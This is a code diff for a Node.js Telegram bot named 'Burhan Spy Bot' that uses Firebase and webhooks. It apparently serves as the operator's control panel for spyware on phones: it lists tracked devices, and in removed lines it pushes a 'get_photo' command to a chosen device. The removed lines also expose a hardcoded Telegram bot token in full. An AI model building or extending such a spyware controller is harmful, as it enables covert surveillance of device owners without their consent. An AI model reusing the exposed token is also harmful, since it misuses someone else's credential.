@@ -1,11 +1,15 @@
 const TelegramBot = require('node-telegram-bot-api');
 const admin = require('firebase-admin');
+const express = require('express');
 
-const token = '8811118034:AAEFtRZ5vsk3n8YlXvUrE0csOVNdlsh7IzM';
-const YOUR_USER_ID = 2062068620;
-const bot = new TelegramBot(token, { polling: false }); // Polling off, webhook on
+const token = process.env.TOKEN; // Railway se TOKEN milega
+const YOUR_USER_ID = process.env.USER_ID; // Railway se USER_ID milega
 
-// Firebase Admin Init (Service Account JSON use kar)
+const bot = new TelegramBot(token, { polling: false }); // Polling OFF, Webhook use hoga
+const app = express();
+app.use(express.json());
+
+// Firebase Setup
 const serviceAccount = require('./firebase-service-account.json');
 admin.initializeApp({
     credential: admin.credential.cert(serviceAccount),
@@ -13,25 +17,20 @@ admin.initializeApp({
 });
 const db = admin.database();
 
-// Webhook endpoint (Railway isko call karega)
-const express = require('express');
-const app = express();
-app.use(express.json());
-
-// Telegram updates yahan aayenge
+// ✅ Webhook Receiver (Telegram messages yahan aayenge)
 app.post('/webhook', (req, res) => {
     bot.processUpdate(req.body);
     res.sendStatus(200);
 });
 
-// Bot commands
+// ✅ Bot Commands
 bot.onText(/\/start/, (msg) => {
     const chatId = msg.chat.id;
     if (!isAuthorized(msg)) {
         bot.sendMessage(chatId, "⛔ Access Denied!");
         return;
     }
-    bot.sendMessage(chatId, `🔥 Welcome to Burhan Spy Bot! 🔥\n\n📜 Commands:\n/devices - View all devices\n/stats - Total devices\n/help - Commands`);
+    bot.sendMessage(chatId, `🔥 Welcome to Burhan Spy Bot! 🔥`);
 });
 
 bot.onText(/\/devices/, (msg) => {
@@ -50,33 +49,12 @@ bot.onText(/\/devices/, (msg) => {
     });
 });
 
-bot.onText(/\/stats/, (msg) => {
-    const chatId = msg.chat.id;
-    if (!isAuthorized(msg)) {
-        bot.sendMessage(chatId, "⛔ Access Denied!");
-        return;
-    }
-    db.ref('devices').once('value', (snapshot) => {
-        const devices = snapshot.val() || {};
-        bot.sendMessage(chatId, `📊 Total Devices: ${Object.keys(devices).length}`);
-    });
-});
-
-bot.onText(/\/getphoto (.+) (.+)/, (msg, match) => {
-    const chatId = msg.chat.id;
-    const deviceId = match[1];
-    const photoPath = match[2];
-    db.ref('commands').child(deviceId).setValue('get_photo');
-    bot.sendMessage(chatId, `📸 Photo request sent for device ${deviceId}...`);
-});
-
-// Helper
+// Authorization
 function isAuthorized(msg) {
-    return msg.from.id === YOUR_USER_ID;
+    return String(msg.from.id) === String(YOUR_USER_ID);
 }
 
-// Server start (Railway is port 3000 use karega)
-const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => {
-    console.log(`Server running on port ${PORT}`);
+// Server Start
+app.listen(3000, () => {
+    console.log("Server running on port 3000");
 });
